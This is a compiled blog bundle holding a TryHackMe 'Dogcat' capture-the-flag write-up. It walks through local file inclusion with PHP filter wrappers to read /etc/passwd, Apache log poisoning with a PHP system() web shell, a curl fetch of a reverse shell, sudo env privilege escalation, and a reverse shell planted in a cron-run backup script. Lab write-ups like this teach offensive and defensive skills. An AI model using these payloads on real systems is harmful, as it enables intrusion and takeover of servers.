"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[6278],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return g}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(n),g=r,h=d["".concat(l,".").concat(g)]||d[g]||u[g]||o;return n?a.createElement(h,i(i({ref:t},c),{},{components:n})):a.createElement(h,i({ref:t},c))}));function g(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,i[1]=s;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},9224:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},assets:function(){return c},toc:function(){return u},default:function(){return g}});var a=n(87462),r=n(63366),o=(n(67294),n(3905)),i=["components"],s={title:"THM Dogcat writeup",description:"Tryhackme Dogcat room writeup",authors:["shivam"],slug:"dogcat",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png",tags:["php wrappers","log poisoning","env","docker","crontab"]},l=void 0,p={permalink:"/Cybernotes/blog/dogcat",source:"@site/blog/2022-03-02-Dogcat/Dogcat.md",title:"THM Dogcat writeup",description:"Tryhackme Dogcat room writeup",date:"2022-03-02T00:00:00.000Z",formattedDate:"March 2, 2022",tags:[{label:"php wrappers",permalink:"/Cybernotes/blog/tags/php-wrappers"},{label:"log poisoning",permalink:"/Cybernotes/blog/tags/log-poisoning"},{label:"env",permalink:"/Cybernotes/blog/tags/env"},{label:"docker",permalink:"/Cybernotes/blog/tags/docker"},{label:"crontab",permalink:"/Cybernotes/blog/tags/crontab"}],readingTime:3.445,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"THM Dogcat writeup",description:"Tryhackme Dogcat room writeup",authors:["shivam"],slug:"dogcat",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png",tags:["php wrappers","log poisoning","env","docker","crontab"]},prevItem:{title:"THM Dejavu writeup",permalink:"/Cybernotes/blog/dejavu"},nextItem:{title:"THM HaskHell writeup",permalink:"/Cybernotes/blog/haskhell"}},c={authorsImageUrls:[void 0]},u=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Gobuster results",id:"gobuster-results",children:[],level:2}],d={toc:u};function g(e){var t=e.components,s=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,a.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Hello everyone,"),(0,o.kt)("p",null,"Today we are going to solve Dogcat room from tryhackme. we will learn about php wrappers,log poisoning,docker and privesc with ",(0,o.kt)("inlineCode",{parentName:"p"},"env")," SUID binary."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png",alt:null})),(0,o.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: dogcat\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,o.kt)("h2",{id:"gobuster-results"},"Gobuster results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/THM/Dogcat]\n\u2514\u2500$ gobuster dir -u http://10.10.238.89/ -w /usr/share/wordlists/dirb/common.txt -t 30 2>/dev/null\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.238.89/\n[+] Method:                  GET\n[+] Threads:                 30\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2021/10/17 12:34:31 Starting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd            (Status: 403) [Size: 277]\n/.hta                 (Status: 403) [Size: 277]\n/.htaccess            (Status: 403) [Size: 277]\n/cats                 (Status: 301) [Size: 311] [--\x3e http://10.10.238.89/cats/]\n/index.php            (Status: 200) [Size: 418]\n/server-status        (Status: 403) [Size: 277]\n===============================================================\n2021/10/17 12:35:03 Finished\n===============================================================\n")),(0,o.kt)("hr",null),(0,o.kt)("p",null,"--\x3e I tried many payloads but didn't succeed. i also tried with null character but still getting error"),(0,o.kt)("p",null,"Then i tried this payload : ",(0,o.kt)("inlineCode",{parentName:"p"},"php://filter/convert.base64-encode/resource=dog/../index")),(0,o.kt)("p",null,"--\x3e And i got the base64 encoded output!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(52175).Z,width:"1666",height:"669"})),(0,o.kt)("p",null,"--\x3e After decoding it i got the source code of ",(0,o.kt)("inlineCode",{parentName:"p"},"index.php")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>dogcat</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\">\n</head>\n\n<body>\n    <h1>dogcat</h1>\n    <i>a gallery of various dogs or cats</i>\n\n    <div>\n        <h2>What would you like to see?</h2>\n        <a href=\"/?view=dog\"><button id=\"dog\">A dog</button></a> <a href=\"/?view=cat\"><button id=\"cat\">A cat</button></a><br>\n        <?php\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n        $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\n            if(isset($_GET['view'])) {\n                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\n                    echo 'Here you go!';\n                    include $_GET['view'] . $ext;\n                } else {\n                    echo 'Sorry, only dogs or cats are allowed.';\n                }\n            }\n        ?>\n    </div>\n</body>\n\n</html>\n")),(0,o.kt)("p",null,"--\x3e here we can see that there is a another parameter which is ",(0,o.kt)("inlineCode",{parentName:"p"},"ext")," and i also got this parameter from arjun. So we can see this parameter is appending after the value of ",(0,o.kt)("inlineCode",{parentName:"p"},"view")," so we have to make the ",(0,o.kt)("inlineCode",{parentName:"p"},"ext")," null and then we can bypass this i guess."),(0,o.kt)("p",null,"--\x3e and i used this payload : ",(0,o.kt)("inlineCode",{parentName:"p"},"php://filter/convert.base64-encode/resource=dog/../../../../../../../../../etc/passwd&ext=")),(0,o.kt)("p",null,"And got the ",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," file"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(32383).Z,width:"1919",height:"673"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n")),(0,o.kt)("p",null,"--\x3e Then i have read ",(0,o.kt)("inlineCode",{parentName:"p"},"/var/log/apache2/access.log")," file and i got the apache2 logs and there i found that the user-agent was reflecting so There is a chance to do ",(0,o.kt)("inlineCode",{parentName:"p"},"log poisoning")),(0,o.kt)("p",null,"I used this payload to read the access log : ",(0,o.kt)("inlineCode",{parentName:"p"},"dog/../../../../../../../../../var/log/apache2/access.log&ext=")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(1754).Z,width:"1901",height:"763"})),(0,o.kt)("p",null,"--\x3e After that i changed the User-agent with ",(0,o.kt)("inlineCode",{parentName:"p"},"<?php system($_GET['c']); ?>")," and added one more parameter with the value : ",(0,o.kt)("inlineCode",{parentName:"p"},"&c=ls")),(0,o.kt)("p",null,"So final payload will be :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=ls\n")),(0,o.kt)("p",null,"And boom we got the result !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(80837).Z,width:"1855",height:"763"})),(0,o.kt)("p",null,"Got the first flag in ",(0,o.kt)("inlineCode",{parentName:"p"},"flag.php")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(31257).Z,width:"1857",height:"707"})),(0,o.kt)("p",null,"After that i uploaded my php reverse shell using curl"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"curl http://<ip>:<port>/shell.php\n")),(0,o.kt)("p",null,"After that execute the file"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"php shell.php\n")),(0,o.kt)("p",null,"--\x3e And i got the reverse shell !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(21946).Z,width:"1920",height:"719"})),(0,o.kt)("p",null,"--\x3e Got the second flag in ",(0,o.kt)("inlineCode",{parentName:"p"},"/var/www")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(78958).Z,width:"961",height:"225"})),(0,o.kt)("p",null,"--\x3e i found the ",(0,o.kt)("inlineCode",{parentName:"p"},"/env")," as runnable by root without password and it was SUID also"),(0,o.kt)("p",null,"i run this command from gtfobins : ",(0,o.kt)("inlineCode",{parentName:"p"},"sudo /usr/bin/env /bin/bash")),(0,o.kt)("p",null,"--\x3e And got the root shell !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(83410).Z,width:"1107",height:"461"})),(0,o.kt)("p",null,"--\x3e Found flag3 in ",(0,o.kt)("inlineCode",{parentName:"p"},"/root")," directory"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(25063).Z,width:"971",height:"261"})),(0,o.kt)("p",null,"--\x3e i tried to search for a flag4 in every directory but i didn't found anything then i found one file called ",(0,o.kt)("inlineCode",{parentName:"p"},"backup.sh")," in ",(0,o.kt)("inlineCode",{parentName:"p"},"/opt")," directory. It was extracting the backup.tar file and then placing it to ",(0,o.kt)("inlineCode",{parentName:"p"},"/root/container")," but there is a no folder named ",(0,o.kt)("inlineCode",{parentName:"p"},"container")," in root directory so i made one reverse shell payload and uploaded it into ",(0,o.kt)("inlineCode",{parentName:"p"},"backup.sh")," file and it is a maybe a crontab so it will execute automatically"),(0,o.kt)("p",null,"--\x3e And after some time i got the reverse shell as root but this time the root directory was changed and i got the flag4 there also"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(32260).Z,width:"1911",height:"965"})),(0,o.kt)("p",null,"--\x3e That means this was the another docker environment and we were in another environment before!"))}g.isMDXComponent=!0},52175:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211017133712-2ff848997161fe1137806bf36dee0f28.png"},32383:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211017134853-e1661e21c86f2f01ffa4453463f8927c.png"},1754:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018101340-2b07af97d0ee1687ffdd41132a33c89b.png"},80837:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018102449-6486fc71813a8550b1f2fe86409c739b.png"},31257:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018102631-5997cf2306c8a0af15a971272a9ce69a.png"},21946:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018103258-19b8d0dfda00cb6a44331d226d1529b2.png"},78958:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018103551-2c7416a44e5ade8553f265ae0e110639.png"},83410:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018105059-d73ebf7266faee23f2e3d9c25e87d992.png"},25063:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018105139-208af686931b3d0bed93728bc5390206.png"},32260:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211018111337-5f74412384cd5358284b5640f927b35c.png"}}]);